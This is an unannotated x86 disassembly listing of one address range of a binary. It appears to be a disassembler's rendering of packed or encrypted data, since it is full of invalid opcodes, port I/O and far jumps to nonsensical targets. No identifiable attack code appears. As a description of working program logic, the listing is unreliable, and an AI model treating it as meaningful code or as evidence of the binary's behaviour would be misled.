  42311d:	fstp   TBYTE PTR [eax-0x32bb53ec]
  423123:	add    esp,DWORD PTR [esi+0x49]
  423126:	cmp    DWORD PTR [ecx-0x1a],0x27
  42312a:	aas    
  42312b:	aam    0x49
  42312d:	jnp    0x4230bf
  42312f:	jo     0x423149
  423131:	sub    al,0xd8
  423133:	out    0xcb,eax
  423135:	and    ah,BYTE PTR [edi+0x4b]
  423138:	aam    0xd
  42313a:	push   ss
  42313b:	mov    ds:0x1f51e26f,eax
  423140:	cmp    ebx,0x4e133060
  423146:	mov    ebp,0xcc8b57b1
  42314b:	cld    
  42314c:	stos   DWORD PTR es:[edi],eax
  42314d:	sbb    DWORD PTR [edi],eax
  42314f:	push   ebx
  423150:	ds adc eax,0xfdd178cd
  423156:	inc    edx
  423157:	cmp    BYTE PTR [esi-0x70],cl
  42315a:	or     BYTE PTR ss:[ebp-0x640901fd],bh
  423161:	pop    esi
  423162:	std    
  423163:	mov    dh,0x31
  423165:	mov    ch,0x29
  423167:	mov    DWORD PTR [ecx+esi*8],eax
  42316a:	and    bh,ah
  42316c:	je     0x42319d
  42316e:	mov    al,ds:0xccea5b67
  423173:	mov    edi,0xec76312a
  423178:	dec    esp
  423179:	ins    BYTE PTR es:[edi],dx
  42317a:	cmp    bh,al
  42317c:	sub    bh,0x39
  42317f:	cmp    ecx,esi
  423181:	into   
  423182:	jmp    0x4d5d5b83
  423187:	(bad)  
  423188:	jne    0x423125
  42318a:	dec    ecx
  42318b:	outs   dx,BYTE PTR ds:[esi]
  42318c:	mov    DWORD PTR [eax-0x6],esp
  42318f:	pushf  
  423190:	mov    eax,ds:0x7b9bbbde
  423195:	add    ebp,esi
  423197:	mov    ecx,0x93eeda26
  42319c:	xchg   ebp,eax
  42319d:	dec    edx
  42319e:	push   0x3e59ead4
  4231a3:	mov    al,0xcc
  4231a5:	cmp    BYTE PTR [edx-0x71],dh
  4231a8:	scas   eax,DWORD PTR es:[edi]
  4231a9:	shr    bl,0x69
  4231ac:	xchg   edx,eax
  4231ad:	xchg   ebp,eax
  4231ae:	mov    WORD PTR [edx-0x36c63be2],ds
  4231b4:	loopne 0x42321a
  4231b6:	push   ds
  4231b7:	call   0xab6e9a2a
  4231bc:	js     0xb2cf987d
  4231c2:	in     al,dx
  4231c3:	mul    DWORD PTR [ebp+0x41]
  4231c6:	jge    0x4231ae
  4231c8:	mov    ax,ds:0x762ef481
  4231ce:	push   esi
  4231cf:	mov    edi,0x66083f09
  4231d4:	jp     0x42320d
  4231d6:	in     al,0xd2
  4231d8:	dec    edx
  4231d9:	dec    esi
  4231da:	xchg   esp,eax
  4231db:	scas   eax,DWORD PTR es:[edi]
  4231dc:	ret    0x4eb4
  4231df:	mov    bl,0x22
  4231e1:	cmp    DWORD PTR [ecx+0x40170b23],esi
  4231e7:	mov    edi,0xc113b5a9
  4231ec:	mov    BYTE PTR [edx],ch
  4231ee:	call   0xdb39f5b8
  4231f3:	xchg   edx,eax
  4231f4:	xchg   edx,eax
  4231f5:	pusha  
  4231f6:	sub    eax,0xcc0ceda7
  4231fb:	pop    esi
  4231fc:	ret    0xc68c
  4231ff:	push   esp
  423200:	sbb    BYTE PTR [ecx+0x68],bh
  423203:	loope  0x423232
  423205:	ret    
  423206:	inc    eax
  423207:	bound  ebp,QWORD PTR [eax]
  423209:	mov    ebp,0xbf3607be
  42320e:	xor    ah,bh
  423210:	or     BYTE PTR [edi-0x68],ah
  423213:	mov    esp,ecx
  423215:	pop    ss
  423216:	das    
  423217:	test   eax,0xaafc4b7b
  42321c:	add    ebp,DWORD PTR [ecx-0x17]
  42321f:	dec    ebp
  423220:	cmp    ebx,edi
  423222:	mov    WORD PTR [edx+esi*8-0x253e7d7e],fs
  423229:	ss push esp
  42322b:	push   edi
  42322c:	push   cs
  42322d:	dec    edx
  42322e:	or     ah,BYTE PTR [ebp-0x798a66f8]
  423234:	mov    dl,0x66
  423236:	and    ah,BYTE PTR [edi+0x40]
  423239:	sub    DWORD PTR [ecx+edx*2+0x75ae8f0c],ecx
  423240:	sbb    ch,ch
  423242:	xchg   BYTE PTR [esi-0xd],cl
  423245:	mov    ch,dl
  423247:	test   al,0xb
  423249:	jnp    0x42329f
  42324b:	sub    al,bh
  42324d:	or     DWORD PTR [esp+eiz*4-0x45],esi
  423251:	push   DWORD PTR [ecx-0x183cc208]
  423257:	xchg   esi,eax
  423258:	in     eax,dx
  423259:	ret    
  42325a:	ins    BYTE PTR es:[edi],dx
  42325b:	rcl    dh,cl
  42325d:	pop    ds
  42325e:	xchg   edi,eax
  42325f:	fidiv  DWORD PTR [edx-0x6be54baf]
  423265:	int3   
  423266:	retf   
  423267:	cmp    BYTE PTR [ecx+edx*1-0x21],dh
  42326b:	shl    DWORD PTR [edx+edx*4+0x2b29a49c],cl
  423272:	and    DWORD PTR [esp+edx*2-0x5360d6ed],0xf
  42327a:	ret    
  42327b:	je     0x42327a
  42327d:	mov    esi,0x88fbc2d9
  423282:	retf   
  423283:	and    ah,bh
  423285:	not    BYTE PTR [edi]
  423287:	push   ebp
  423288:	xchg   BYTE PTR [ecx+eiz*2],bh
  42328b:	and    BYTE PTR [edx+edx*2+0x0],dh
	...
  42329a:	inc    ebx
  42329b:	inc    ecx
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	outs   dx,DWORD PTR ds:[esi]
  4232a7:	gs sbb dh,cl
  4232aa:	mov    ah,0xac
  4232ac:	add    DWORD PTR [eax],eax
  4232ae:	cld    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    BYTE PTR [ecx],bl
  4232b3:	inc    bx
  4232b5:	mov    eax,?
  4232b7:	loop   0x42324a
  4232b9:	or     bh,bh
  4232bb:	or     dh,ch
  4232bd:	dec    eax
  4232be:	es sub DWORD PTR gs:[esi-0x3f],esp
  4232c3:	sub    ecx,edi
  4232c5:	in     al,dx
  4232c6:	ret    0xd78d
  4232c9:	jge    0x423348
  4232cb:	adc    DWORD PTR [esi+0x50],edi
  4232ce:	imul   ebx,esp,0x1
  4232d1:	pusha  
  4232d2:	lock neg BYTE PTR [esi+0x7da2fb9a]
  4232d9:	pop    ebx
  4232da:	add    al,0x18
  4232dc:	jg     0x42334c
  4232de:	out    dx,eax
  4232df:	stos   BYTE PTR es:[edi],al
  4232e0:	retf   0xe101
  4232e3:	arpl   WORD PTR [ebx+0x32],dx
  4232e6:	mov    bh,0xb0
  4232e8:	ja     0x4232f9
  4232ea:	or     BYTE PTR [edx+edi*1],0x8
  4232ee:	and    eax,0x946896d8
  4232f3:	dec    esi
  4232f4:	cmp    BYTE PTR [ebp+0x5a],0x2e
  4232f8:	icebp  
  4232f9:	push   ebp
  4232fa:	jmp    0x8923c199
  4232ff:	sbb    bl,BYTE PTR [esi*4-0x486bedbe]
  423306:	fstp   TBYTE PTR [ebx+0x52]
  423309:	(bad)  [eax+0x5f]
  42330c:	hlt    
  42330d:	hlt    
  42330e:	mov    esi,0x82354848
  423313:	mov    edi,0x6528136a
  423318:	outs   dx,DWORD PTR ds:[esi]
  423319:	and    al,0xfb
  42331b:	repnz adc ah,BYTE PTR [edx]
  42331e:	daa    
  42331f:	mov    ebp,0xe62eb870
  423324:	cmp    esp,0x6550694c
  42332a:	jb     0x423376
  42332c:	xchg   BYTE PTR [ebp+eax*8+0x313d110b],ah
  423333:	push   ds
  423334:	pop    eax
  423335:	ret    0x9df
  423338:	inc    eax
  423339:	movd   mm7,DWORD PTR [edx+0x17]
  42333d:	mov    al,ds:0x21b72514
  423342:	mov    ds,WORD PTR ds:0x51af6e22
  423348:	adc    esi,DWORD PTR [eax-0x4f854b45]
  42334e:	mov    dh,0xfc
  423350:	push   esp
  423351:	ret    0x6ddb
  423354:	xchg   DWORD PTR [edx-0x6bfabce2],edi
  42335a:	pmaddwd mm6,mm1
  42335d:	ins    BYTE PTR es:[edi],dx
  42335e:	popf   
  42335f:	or     DWORD PTR [ebx],0x925ce20
  423365:	cmp    DWORD PTR [ecx],edx
  423367:	inc    esi
  423368:	in     al,dx
  423369:	out    dx,al
  42336a:	ret    
  42336b:	or     eax,0x8383868b
  423370:	push   ecx
  423371:	imul   esi,DWORD PTR [edi-0x5c],0x78
  423375:	inc    ecx
  423376:	mov    ecx,0x712bd670
  42337b:	(bad)  
  42337c:	jmp    0x4233a1
  42337e:	sbb    bh,BYTE PTR [esp+ecx*8+0x3b6aa921]
  423385:	mov    ds:0xa4fa6bb0,al
  42338a:	pusha  
  42338b:	loop   0x42334a
  42338d:	xor    dh,BYTE PTR [eax-0x4]
  423390:	fiadd  DWORD PTR [ecx-0x6e]
  423393:	cmp    dh,dh
  423395:	and    BYTE PTR [esi+0x56],0x20
  423399:	outs   dx,BYTE PTR ds:[esi]
  42339a:	leave  
  42339b:	(bad)  
  42339c:	retf   0x28ef
  42339f:	mov    esi,eax
  4233a1:	adc    cl,BYTE PTR [ecx+0x2c]
  4233a4:	fucom  st(0)
  4233a6:	sub    al,0x32
  4233a9:	int    0x26
  4233ab:	cmp    esp,ebx
  4233ad:	jge    0x42340f
  4233af:	push   esp
  4233b0:	outs   dx,DWORD PTR ds:[esi]
  4233b1:	sar    BYTE PTR [edi+0x708789df],cl
  4233b7:	mov    esi,0xb4d25ff8
  4233bc:	in     eax,dx
  4233bd:	push   ss
  4233be:	mov    al,ds:0x7ff79af2
  4233c3:	lods   al,BYTE PTR ss:[esi]
  4233c5:	mov    DWORD PTR [edi+0x23],ebp
  4233c8:	or     al,0x1a
  4233ca:	fisub  WORD PTR [edx-0x5ba1f9d4]
  4233d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233d1:	xchg   BYTE PTR [edi+0x7d2702d8],bl
  4233d7:	pushf  
  4233d8:	dec    edx
  4233d9:	stc    
  4233da:	ja     0x42336e
  4233dc:	adc    eax,0xa510ddc7
  4233e1:	in     eax,0xed
  4233e3:	add    ch,BYTE PTR [esi+edx*2]
  4233e6:	fiadd  WORD PTR [esi+0x23da305e]
  4233ec:	jp     0x423450
  4233ee:	out    dx,al
  4233ef:	call   0x4e65:0x259b92fc
  4233f6:	dec    edx
  4233f7:	or     ch,BYTE PTR [edi+ebx*8+0xd8e31de]
  4233fe:	jmp    0x4233ea
  423400:	pushf  
  423401:	add    ah,cl
  423403:	int3   
  423404:	mov    ds:0xf5850847,eax
  423409:	cmp    al,0x1f
  42340b:	(bad)
  42340e:	fidiv  DWORD PTR [esi+0x3d]
  423411:	jmp    0x994c:0xc0503314
  423418:	stc    
  423419:	sbb    DWORD PTR [esi+0x53],esi
  42341c:	cmp    ecx,ebx
  42341e:	aas    
  42341f:	(bad)  
  423420:	add    al,0xed
  423422:	xor    al,0x70
  423424:	cs dec esi
  423426:	cmp    dl,ch
  423428:	rol    BYTE PTR fs:[esi-0x6e],1
  42342c:	retf   
  42342d:	(bad)  
  42342e:	pop    esi
  42342f:	jecxz  0x4234a7
  423431:	jg     0x4233e2
  423433:	push   0x72
  423435:	xor    al,BYTE PTR [esi]
  423437:	nop
  423438:	in     al,0xf
  42343a:	add    cl,BYTE PTR [ebx]
  42343c:	arpl   WORD PTR [ebp+0x54f0f71f],bx
  423442:	pop    esp
  423443:	mov    ebx,0xe5fb6de2
  423448:	repnz push 0xffffffbe
  42344b:	fdiv   QWORD PTR ds:0x1da2ebd2
  423451:	adc    esi,edi
  423453:	in     al,0xef
  423455:	jno    0x423488
  423457:	sub    bl,BYTE PTR [edx+0x58ea58ca]
  42345d:	ret    
  42345e:	jecxz  0x423492
  423460:	(bad)  
  423461:	or     dl,BYTE PTR [esi+0x3972e51d]
  423467:	sbb    BYTE PTR [esi+0x52],ah
  42346a:	mov    ebp,0x3b730019
  42346f:	frstor [ebx-0x34be5692]
  423475:	(bad)  
  423476:	(bad)  
  423477:	out    dx,al
  423478:	adc    dl,bl
  42347a:	ss add bh,al
  42347d:	pop    es
  42347e:	outs   dx,DWORD PTR ds:[esi]
  42347f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423480:	mov    edx,0x26f0b531
  423485:	adc    edx,DWORD PTR [ebx-0x78f5361d]
  42348b:	leave  
  42348c:	aad    0x9c
  42348e:	xchg   BYTE PTR [eax+0x17d803c4],bh
  423494:	pop    ebx
  423495:	adc    DWORD PTR [edx+0x75b33e85],0xffffffb5
  42349c:	sbb    BYTE PTR [ebp+0x50],dl
  42349f:	and    al,0x85
  4234a1:	mov    ds:0xfbc605fd,al
  4234a6:	adc    BYTE PTR [esi],ch
  4234a8:	stc    
  4234a9:	daa    
  4234aa:	ss jge 0x4234cb
  4234ad:	std    
	...
  4234ba:	mov    ebp,edx
  4234bc:	rcr    DWORD PTR [ebx],cl
  4234be:	repz cmp ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	mov    ebx,0xb01efdf2
  4234cb:	scas   al,BYTE PTR es:[edi]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	cld    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [esi],bh
  4234d3:	sti    
  4234d4:	xchg   ebx,eax
  4234d5:	adc    cl,BYTE PTR [ecx]
  4234d7:	cmp    dh,BYTE PTR [ecx+ebp*2-0x22320dc2]
  4234de:	addr16 push 0x4b
  4234e1:	pop    es
  4234e2:	lds    edi,FWORD PTR [eax-0x4]
  4234e5:	scas   eax,DWORD PTR es:[edi]
  4234e6:	add    eax,0xf42c3d05
  4234eb:	sub    al,0x31
  4234ed:	lods   eax,DWORD PTR ds:[esi]
  4234ee:	adc    DWORD PTR [edi-0x30],0x83ca7811
  4234f5:	mov    esp,0xbabd4266
  4234fa:	(bad)  
  4234fb:	adc    al,0xec
  4234fd:	jp     0x42353c
  4234ff:	xor    BYTE PTR [esp+ebp*4-0x4ebe7bf7],0x7d
  423507:	imul   ecx,DWORD PTR [esi-0x9],0x9
  42350b:	(bad)  
  42350c:	iret   
  42350d:	popf   
  42350e:	cdq    
  42350f:	jo     0x423563
  423511:	or     esi,eax
  423513:	pop    edi
  423514:	call   0x119d5533
  423519:	sub    al,0x65
  42351b:	sbb    al,0x26
  42351d:	(bad)  
  42351f:	xchg   DWORD PTR [ecx+0x5e],edi
  423522:	in     eax,dx
  423523:	xchg   ebx,eax
  423524:	pop    edi
  423525:	fsub   QWORD PTR [edx+0x55]
  423528:	in     eax,0xdf
  42352a:	popa   
  42352b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42352c:	cvttps2pi mm2,QWORD PTR [ebx+0x58]
  423530:	xlat   BYTE PTR ds:[ebx]
  423531:	inc    ebx
  423532:	inc    ebp
  423533:	fadd   st(6),st
  423535:	sub    eax,0x2a91255d
  42353a:	or     ebp,DWORD PTR [ebx+edi*2+0x6d6d0ced]
  423541:	je     0x42355e
  423543:	adc    BYTE PTR [eax],dl
  423545:	xor    esi,DWORD PTR [ecx*4+0x1a24b98d]
  42354c:	addr16 enter 0xa606,0x84
  423551:	out    dx,eax
  423552:	aaa    
  423553:	jb     0x423532
  423555:	lds    ebp,FWORD PTR [ecx-0x12]
  423558:	xchg   edx,eax
  423559:	sar    bh,cl
  42355b:	iret   
  42355c:	add    eax,DWORD PTR [edi-0x719639c]
  423562:	call   DWORD PTR [ebx]
  423564:	inc    esi
  423565:	push   ebx
  423566:	ficom  WORD PTR [ebx+0x3c]
  423569:	jmp    0x4235e8
  42356b:	sbb    BYTE PTR [eax-0x3e7a8874],cl
  423571:	(bad)  
  423572:	sti    
  423573:	jp     0x423553
  423575:	cs test eax,0xa6aabdca
  42357b:	in     al,dx
  42357c:	jmp    0x9bb79777
  423581:	push   0x5c9ad0e1
  423586:	push   esi
  423587:	sub    ah,BYTE PTR [ecx+esi*8+0x617ddb8e]
  42358e:	push   edx
  42358f:	add    eax,DWORD PTR [edi-0xd]
  423592:	or     bh,BYTE PTR [ecx-0x77]
  423595:	pusha  
  423596:	enter  0x6205,0x13
  42359a:	fadd   st(3),st
  42359c:	in     al,dx
  42359d:	mov    dh,0x15
  42359f:	mov    BYTE PTR [eax+ecx*4-0x338bd80],ah
  4235a6:	pop    es
  4235a7:	sub    eax,ebx
  4235a9:	xchg   BYTE PTR [ecx-0x5b],ah
  4235ac:	fwait
  4235ad:	sbb    cl,BYTE PTR [ebp+0x4e7a743d]
  4235b3:	cmp    BYTE PTR [ebx+0x5e9a5faf],0xad
  4235ba:	scas   eax,DWORD PTR es:[edi]
  4235bb:	dec    ebx
  4235bc:	or     al,0x29
  4235be:	bound  edi,QWORD PTR [ebx+ecx*8+0x20]
  4235c2:	pop    edx
  4235c3:	cwde   
  4235c4:	cmp    ch,BYTE PTR [ebx-0xa2c7684]
  4235ca:	or     al,0x2d
  4235cc:	scas   al,BYTE PTR es:[edi]
  4235cd:	jo     0x423600
  4235cf:	scas   eax,DWORD PTR es:[edi]
  4235d0:	shl    BYTE PTR [esi+0x378cedca],1
  4235d6:	add    DWORD PTR [ecx],edx
  4235d8:	pop    edx
  4235d9:	pop    esp
  4235da:	or     al,0x76
  4235dc:	fimul  DWORD PTR [edi]
  4235de:	dec    eax
  4235df:	out    0xe3,eax
  4235e1:	sbb    DWORD PTR [esi],0x198244a3
  4235e7:	mov    ecx,0x51b2b8af
  4235ec:	push   ecx
  4235ed:	xchg   edi,eax
  4235ee:	arpl   WORD PTR [esi-0x18],sp
  4235f1:	fstp   QWORD PTR [esi]
  4235f3:	test   ebx,esp
  4235f5:	mov    ecx,0x7392b19f
  4235fa:	es fiadd DWORD PTR cs:[esi+0x14]
  4235ff:	es and al,0x21
  423602:	mov    edx,0x8301ceb0
  423607:	jne    0x4235a7
  423609:	xor    eax,0xeabb037
  42360e:	cmp    edi,DWORD PTR [edi]
  423610:	idiv   BYTE PTR [esi]
  423612:	ins    DWORD PTR es:[edi],dx
  423613:	xor    DWORD PTR [edx-0x45],eax
  423616:	mov    dh,0x58
  423618:	(bad)  
  42361a:	inc    edx
  42361b:	jns    0x4235ac
  42361d:	push   esp
  42361e:	dec    ebx
  42361f:	iret   
  423620:	scas   al,BYTE PTR es:[edi]
  423621:	repnz into 
  423623:	and    DWORD PTR ds:0x1e21e815,ebp
  423629:	repnz stos BYTE PTR es:[edi],al
  42362b:	fisubr DWORD PTR [ebp+0x2a36eff2]
  423631:	and    DWORD PTR [ecx+0x464d5b38],ebp
  423637:	sub    DWORD PTR [ebx+0xa0befa0],0xdfd86324
  423641:	call   0x15112405
  423646:	or     al,0x52
  423648:	rcl    esi,cl
  42364a:	aaa    
  42364b:	cli    
  42364c:	mov    bl,0x8f
  42364e:	adc    DWORD PTR [eax-0x55],ecx
  423651:	add    BYTE PTR [ebp-0x4b],0x64
  423655:	cmp    edi,edi
  423657:	ja     0x423685
  423659:	pop    ebp
  42365a:	sbb    ah,ch
  42365c:	outs   dx,DWORD PTR ds:[esi]
  42365d:	mov    ecx,0xa55ddca3
  423662:	lea    ebx,[eax+eiz*4+0x4cda256]
  423669:	jne    0x423606
  42366b:	sbb    DWORD PTR [edi+edx*8-0x16b21711],esp
  423672:	adc    esi,DWORD PTR [ecx+ecx*4+0x34]
  423676:	es out 0xd9,al
  423679:	sbb    BYTE PTR [edx-0x26fb2ab3],bl
  42367f:	sub    al,0x62
  423681:	xchg   BYTE PTR [edi],bl
  423683:	imul   edi,DWORD PTR es:[edi],0xc0c42a6d
  42368a:	push   ecx
  42368b:	xor    eax,0x576d89ce
  423690:	test   al,0x7d
  423692:	fist   WORD PTR [ebp-0x5d103bbf]
  423698:	out    0x22,al
  42369a:	cdq    
  42369b:	fwait
  42369c:	sbb    dh,ah
  42369e:	lds    ebp,FWORD PTR ds:0xe3426449
  4236a4:	pop    edi
  4236a5:	adc    al,0xaa
  4236a7:	inc    eax
  4236a8:	ins    DWORD PTR es:[edi],dx
  4236a9:	xchg   edx,eax
  4236aa:	xchg   edi,eax
  4236ab:	psadbw mm5,QWORD PTR ds:[edi]
  4236af:	mov    ebx,0xce98b29
  4236b4:	mov    dh,0x25
  4236b6:	xor    al,0xfa
  4236b8:	jg     0x423654
  4236ba:	int    0x94
  4236bc:	in     al,0xcb
  4236be:	(bad)  
  4236bf:	jmp    0x423677
  4236c1:	and    edx,DWORD PTR [ebx]
  4236c3:	fcom   st(1)
  4236c5:	xor    al,0xdf
  4236c7:	mov    dh,0x78
  4236c9:	fwait
  4236ca:	lods   al,BYTE PTR ds:[esi]
  4236cb:	leave  
  4236cc:	pusha  
  4236cd:	jns    0x4236cf
	...
  4236d7:	add    BYTE PTR [eax],al
  4236d9:	add    dl,dl
  4236db:	and    dl,BYTE PTR [esi-0x21410966]
  4236e1:	push   0x61
  4236e3:	push   cs
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	outs   dx,DWORD PTR ds:[esi]
  4236e7:	cmp    esi,edx
  4236e9:	add    ch,BYTE PTR [eax+esi*4+0x1fc0001]
  4236f0:	add    BYTE PTR [eax],al
  4236f2:	inc    esp
  4236f3:	sar    BYTE PTR ds:[ebp-0x6d],0x55
  4236f8:	push   ds
  4236f9:	mov    edi,0x6c3c8972
  4236fe:	xor    eax,0xa920cfee
  423703:	popa   
  423704:	push   esi
  423705:	aad    0xc7
  423707:	(bad)  
  423708:	fstp   QWORD PTR [eax-0x24]
  42370b:	pop    ds
  42370c:	push   0x214ffd25
  423711:	(bad)  
  423712:	lea    esp,[esi-0x3e]
  423715:	outs   dx,BYTE PTR ds:[esi]
  423716:	or     DWORD PTR [ebp+eax*4+0x4],ebx
  42371a:	(bad)  
  42371b:	ds js  0x423795
  42371e:	clc    
  42371f:	pop    ecx
  423720:	xchg   ebx,eax
  423721:	stc    
  423722:	mov    ebx,0xde8a8612
  423727:	add    DWORD PTR [edx+0x7b16d53e],ebx
  42372d:	scas   al,BYTE PTR es:[edi]
  42372e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42372f:	adc    esi,DWORD PTR [esi+0x52200f48]
  423735:	bound  edx,QWORD PTR [edi+0x75bd15b1]
  42373b:	dec    ebx
  42373c:	cmp    al,0xbe
  42373e:	mov    ch,0xa2
  423740:	sbb    al,0x42
  423742:	(bad)  
  423743:	jmp    0xc866:0x1d24b0e9
  42374a:	cmp    DWORD PTR [edi],ecx
  42374c:	pop    ebp
  42374d:	pop    ds
  42374e:	mov    ds:0x33f0479,al
  423753:	jmp    0x42377d
  423755:	push   ebp
  423756:	fadd   DWORD PTR [ebx+edi*8-0x14d2c8fe]
  42375d:	mov    ebp,0x8b9c711d
  423762:	jp     0x423741
  423764:	mov    al,0xc9
  423766:	mov    ch,0x1a
  423768:	adc    DWORD PTR [ecx+0x7c],ebx
  42376b:	mov    dl,0x1a
  42376d:	or     ebx,ebp
  42376f:	cmp    eax,0xb9c71202
  423774:	sbb    ecx,DWORD PTR [ebp+eax*1+0x20348dcd]
  42377b:	mov    esi,0x649b97b2
  423780:	push   es
  423781:	push   ss
  423782:	in     eax,0x95
  423784:	xchg   ebx,eax
  423785:	pop    edi
  423786:	xor    BYTE PTR ds:0x6ebd36d9,bl
  42378c:	fcmovnb st,st(3)
  42378e:	xchg   DWORD PTR [esi-0x5fd65a03],ebp
  423794:	jmp    0x47c61fba
  423799:	mov    ds:0xd1e9bea9,eax
  42379e:	xor    ecx,DWORD PTR [ebp*1-0x7a6dfaa9]
  4237a5:	js     0x423766
  4237a7:	enter  0xf346,0xc6
  4237ab:	daa    
  4237ac:	mov    ebx,0xe8c216f7
  4237b1:	and    BYTE PTR [ecx],dh
  4237b3:	xchg   edi,eax
  4237b4:	or     ch,BYTE PTR [edx]
  4237b6:	ret    
  4237b7:	addr16 lahf 
  4237b9:	jmp    0x42377e
  4237bb:	das    
  4237bc:	jae    0x4237fd
  4237be:	sbb    al,0xbd
  4237c0:	rcl    edi,1
  4237c2:	ret    0x5814
  4237c5:	(bad)  
  4237c6:	jle    0x42383c
  4237c8:	sub    al,0x97
  4237ca:	outs   dx,BYTE PTR ds:[esi]
  4237cb:	mov    ch,0xbc
  4237cd:	mov    dl,0x22
  4237cf:	icebp  
  4237d0:	push   edx
  4237d1:	or     edx,esp
  4237d3:	mov    dl,0x4a
  4237d6:	out    0x42,eax
  4237d8:	outs   dx,DWORD PTR ds:[esi]
  4237d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237da:	push   edx
  4237db:	xor    BYTE PTR [eax+esi*4-0x12ac395c],0x28
  4237e3:	mov    dl,0x7a
  4237e5:	cld    
  4237e6:	xchg   DWORD PTR [ecx],ebp
  4237e8:	pop    ecx
  4237e9:	sbb    BYTE PTR [edi+0x41d60ce0],bl
  4237ef:	sub    DWORD PTR [eax+0xf72d051],0x1
  4237f6:	adc    BYTE PTR [esi],0x39
  4237f9:	ror    DWORD PTR [eax-0x1d],1
  4237fc:	je     0x4237e3
  4237fe:	jl     0x4237f5
  423800:	pop    ebp
  423801:	cmp    eax,0x13e30560
  423806:	jns    0x423865
  423808:	test   edi,ebp
  42380a:	jg     0x423804
  42380c:	daa    
  42380d:	xchg   DWORD PTR [eax-0x6d4d57f7],ebp
  423813:	and    DWORD PTR [ebx+0x5b],0xdd2cb00c
  42381a:	push   ds
  42381b:	retf   
  42381c:	sub    al,0x32
  42381e:	dec    edx
  42381f:	popa   
  423820:	lahf   
  423821:	mov    ?,WORD PTR [ebx+0x5694b573]
  423827:	pop    ss
  423828:	pop    es
  423829:	aaa    
  42382a:	sub    DWORD PTR [ebx],esi
  42382c:	sbb    eax,0x3e45ff92
  423831:	inc    ecx
  423832:	xor    dl,BYTE PTR [edi-0x57]
  423835:	fmulp  st(4),st
  423837:	dec    ecx
  423838:	cmp    bh,BYTE PTR [ebx+0x6f]
  42383b:	(bad)  
  42383c:	fnstsw WORD PTR [edi+ecx*4-0x7d]
  423840:	call   0x7072:0x195f13bf
  423847:	pop    eax
  423848:	mov    al,ds:0x6b36ea5b
  42384e:	dec    ebp
  42384f:	cld    
  423850:	xchg   DWORD PTR [esi+0x747959de],ebp
  423856:	jne    0x423894
  423858:	loopne 0x4237eb
  42385a:	inc    edi
  42385b:	and    edx,DWORD PTR [edx-0x47]
  42385e:	sbb    ch,BYTE PTR [ebx-0x2e]
  423861:	mov    esp,0x2d7b8d11
  423866:	sti    
  423867:	rcr    BYTE PTR [ebx],0x33
  42386a:	pop    esi
  42386b:	xor    DWORD PTR [ebx+0x5],ecx
  42386e:	daa    
  42386f:	pop    ss
  423870:	inc    esp
  423871:	(bad)  
  423872:	mov    ?,WORD PTR [edx-0x60]
  423875:	call   0x2429a1f1
  42387a:	dec    ecx
  42387b:	add    bl,BYTE PTR [ebx+0x492e2cd7]
  423881:	outs   dx,DWORD PTR ds:[esi]
  423882:	mov    ds:0x5756a2a7,al
  423887:	fistp  WORD PTR [eax-0x3427230e]
  42388d:	adc    ch,BYTE PTR [ecx]
  42388f:	mov    edi,0x5f5ecde1
  423894:	loopne 0x4238cc
  423896:	aad    0xdc
  423898:	xor    BYTE PTR [ebp-0x614fa8ad],dh
  42389e:	adc    bl,BYTE PTR [ecx]
  4238a0:	sub    eax,0xeb214ca7
  4238a5:	xchg   ecx,eax
  4238a6:	or     eax,0x5f50f3a0
  4238ab:	xchg   edi,eax
  4238ac:	mov    bh,0x1c
  4238ae:	jp     0x4238db
  4238b0:	ins    BYTE PTR es:[edi],dx
  4238b1:	outs   dx,DWORD PTR ds:[esi]
  4238b2:	cmp    eax,0xcd150dce
  4238b7:	mov    ds:0xfed222c2,eax
  4238bc:	pushf  
  4238bd:	mov    esi,0x615e7c82
  4238c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238c3:	fistp  WORD PTR [edi]
  4238c5:	add    al,0xbe
  4238c7:	xor    al,0x27
  4238c9:	mov    DWORD PTR [ebx+0x1],0x285330ef
  4238d0:	cmc    
  4238d1:	pop    edx
  4238d2:	jp     0x4238cc
  4238d4:	int3   
  4238d5:	jae    0x4238bf
  4238d7:	add    BYTE PTR [esi-0x570d63ab],ch
  4238dd:	and    DWORD PTR [ecx],0x545e5d4
  4238e3:	mov    eax,ds:0x8a36f3f8
  4238e8:	dec    edi
  4238e9:	sub    edx,edx
  4238eb:	in     eax,dx
  4238ec:	fnstsw WORD PTR [edi]
	...
  4238fa:	fnstsw WORD PTR [edi+ecx*4]
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	sbb    BYTE PTR [edi],0xc7
  423909:	jne    0x4238b3
  42390b:	mov    dl,0x1
  42390d:	add    ah,bh
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [ecx-0x2827730f],ch
  423917:	popa   
  423918:	fbld   TBYTE PTR [edi+0xe]
  42391b:	iret   
  42391c:	sbb    bl,BYTE PTR [ebx-0x7a]
  42391f:	repnz outs dx,DWORD PTR ds:[esi]
  423921:	test   eax,0x2d646391
  423926:	dec    esi
  423927:	ret    0xffb1
  42392a:	jge    0x423925
  42392c:	jnp    0x42398a
  42392e:	sbb    DWORD PTR [edi-0x9258ead],0x9bc8053c
  423938:	push   ebx
  423939:	cmp    al,0xd3
  42393b:	push   ebp
  42393c:	inc    edx
  42393d:	push   ds
  42393e:	jle    0x42394b
  423940:	(bad)  
  423941:	sub    ah,al
  423943:	inc    ecx
  423944:	bound  edi,QWORD PTR [esi+eax*2-0x54de5561]
  42394b:	rcl    DWORD PTR [eax+0x5eb1dc17],cl
  423951:	or     BYTE PTR [esi+0x53ba36a3],ch
  423957:	pop    ecx
  423958:	jnp    0x4239d2
  42395a:	in     eax,dx
  42395b:	pop    esp
  42395c:	pop    ss
